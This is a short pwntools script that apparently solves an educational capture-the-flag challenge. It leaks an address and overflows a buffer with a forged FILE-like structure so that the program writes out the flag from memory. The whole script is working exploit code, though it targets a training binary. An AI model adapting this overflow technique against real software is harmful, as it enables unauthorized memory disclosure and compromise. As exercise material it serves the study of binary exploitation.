from pwn import *

context.terminal = ['tmux', 'split', '-h']
context.binary = "./chal"

# p = process("./chal")
p = remote("edu-ctf.zoolab.org", 30215)

p.recvuntil("0x")

note_buf = int(p.recvline(), base=16)
flag_addr = note_buf - 0x1010
print(hex(note_buf), hex(flag_addr))

print(hex(note_buf+0x210))

p.sendlineafter(">", "1")
p.sendlineafter(">", "2")

flag = 0x0800

payload = flat(
    flag, 0,
    flag_addr, 0,
    flag_addr, flag_addr + 0x50,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)
p.sendlineafter("data>", b'A'*0x210+payload)
gdb.attach(p)

p.sendlineafter(">", "3")

p.interactive()